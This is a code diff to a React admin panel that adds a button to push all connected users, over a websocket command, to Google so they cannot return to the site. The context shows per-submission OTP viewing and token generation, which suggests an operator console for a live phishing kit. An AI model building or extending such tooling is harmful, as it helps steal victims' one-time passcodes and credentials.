@@ -374,6 +374,18 @@ const AdminPanel = () => {
     }
   };
 
+  const redirectUsersToGoogle = () => {
+    if (window.confirm('Are you sure you want to redirect all users to Google? They will not be able to return to your website.')) {
+      // Send command to all connected clients to redirect to Google
+      wsClient.send('admin_command', {
+        command: 'redirect_to_google',
+        created_at: new Date().toISOString(),
+      });
+      
+      showNotification('Redirect command sent to all users');
+    }
+  };
+
   const handleShowOtp = (submissionId: string) => {
     console.log('Admin Panel: Show OTP clicked for submission:', submissionId);
     setSelectedSubmissionId(submissionId);
@@ -415,6 +427,20 @@ const AdminPanel = () => {
         }`}>
           {connectionStatus}
         </span>
+        
+        {/* Google Redirect Button */}
+        <button
+          onClick={redirectUsersToGoogle}
+          className="ml-4 bg-white hover:bg-gray-100 text-black px-3 py-1 rounded text-sm flex items-center gap-2"
+          title="Redirect all users to Google"
+        >
+          <img 
+            src="https://www.google.com/favicon.ico" 
+            alt="Google" 
+            className="w-4 h-4"
+          />
+          Google
+        </button>
         
         {/* Generate New Token Button */}
         <button
